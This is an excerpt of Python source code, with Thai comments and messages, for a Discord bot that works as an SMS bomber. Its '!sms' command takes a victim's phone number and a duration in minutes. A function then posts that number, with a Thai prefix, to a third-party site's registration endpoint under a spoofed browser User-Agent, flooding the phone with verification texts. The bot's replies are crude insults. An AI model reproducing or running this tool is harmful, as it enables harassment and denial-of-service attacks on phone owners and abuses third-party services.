...
PREFIX = '' #prefix บอท เช่นใช้ prefix เป็น ! เวลาใช้คำสั่งก็จะเป็น !sms
TOKEN = '' #ใส่ Token ของบอท
LIMIT = 5 #ใส่ได้เยอะมากกว่านั้นแล้วแต่เลย
...
def sk33(phone):
    post("https://findclone.ru/register?phone=+66{phone[1:]}",headers={"X-Requested-With" : "XMLHttpRequest","User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36"})
...
async def sms(ctx, phone=None, amount=None):
    if (str(ctx.message.channel.id) == 'ห้องให้บอททำงาน'): #ห้องเฉพาะบอท
        if (phone == None or amount == None):
            await ctx.send("> ใส่เบอร์กับจำนวนให้ถูกด้วยไอ่ควาย",delete_after=15)
            await ctx.message.delete()
            ...
            try:
                amount = int(amount)
                if (amount > LIMIT):
                    await ctx.send(f"> จะใส่จำนวนเกิน {str(LIMIT)} นาทีทำเหี้ยไร",delete_after=15)
                    await ctx.message.delete()

                else:
                    await ctx.send(f"> เริ่มยิงไปที่เบอร์เหี้ยนี่ละ **{phone}** | เป็นเวลา **{amount}** นาที",delete_after=15)
                    startall(phone, amount)
                    await ctx.message.delete()

            except:
                await ctx.send("> มึงใส่จำนวนให้ถูกหน่อยดิ",delete_after=15)
                await ctx.message.delete()

                
    else:
        await ctx.send("> ใช้คำสั่งให้ถูกห้องด้วยไอ่สัส",delete_after=15)
        await ctx.message.delete()
